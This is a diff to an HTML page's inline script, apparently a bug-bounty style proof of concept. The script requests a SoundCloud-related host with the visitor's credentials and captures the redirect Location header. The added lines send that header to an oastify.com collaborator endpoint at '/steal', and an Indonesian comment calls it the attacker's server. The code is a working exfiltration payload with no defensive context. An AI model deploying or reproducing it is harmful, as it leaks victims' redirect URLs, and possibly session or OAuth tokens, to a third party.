@@ -8,16 +8,27 @@
     <script>
         fetch('https://airflow.soundcloud.org', {
             method: 'GET',
-            credentials: 'include'
+            credentials: 'include',
+            redirect: 'manual' // Mencegah fetch mengikuti redirect otomatis
         })
         .then(response => {
             if (response.status === 302) {
                 var locationHeader = response.headers.get('Location');
-                console.log(locationHeader);
-            }
+                if (locationHeader) {
+                    console.log("Location Header:", locationHeader);
+                    // Kirim lokasi ke server penyerang
+                    var exfiltrateXhr = new XMLHttpRequest();
+                    exfiltrateXhr.open("GET", "https://569mgtujeb7m4nztnsxzf9te157wvmjb.oastify.com/steal?location=" + encodeURIComponent(locationHeader), true);
+                    exfiltrateXhr.send();
+                } else {
+                    console.log("Header 'Location' tidak ditemukan.");
+                }
+            } else {
+                console.log("Respons tidak berstatus 302.");
             }
         })
         .catch(error => console.log("Gagal mengambil link:", error));
     </script>
 </body>
 </html>
+
